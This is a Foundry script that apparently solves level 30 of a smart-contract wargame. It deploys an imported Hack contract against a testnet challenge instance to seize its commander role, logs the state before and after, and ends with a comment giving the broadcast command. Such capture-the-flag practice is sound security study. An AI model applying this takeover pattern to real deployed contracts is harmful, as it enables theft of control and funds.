// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, IHigherOrder} from "../src/level30.sol";

contract Level30Script is Script {
    function run(address instanceAddress) external {
        IHigherOrder target = IHigherOrder(instanceAddress);

        address commanderBefore = target.commander();
        uint256 treasuryBefore = target.treasury();
        console.log("Commander before:", commanderBefore);
        console.log("Treasury before:", treasuryBefore);

        vm.startBroadcast();
        Hack attackContract = new Hack();
        attackContract.hack(instanceAddress);
        target.claimLeadership();
        vm.stopBroadcast();

        address commanderAfter = target.commander();
        uint256 treasuryAfter = target.treasury();
        console.log("Commander after:", commanderAfter);
        console.log("Treasury after:", treasuryAfter);
        console.log("Attack successful:", commanderAfter != address(0));
    }
}
//forge script script/level30.s.sol:Level30Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey --sig "run(address)" 0x786b68afDbd217308189b967D098cAd137d98691
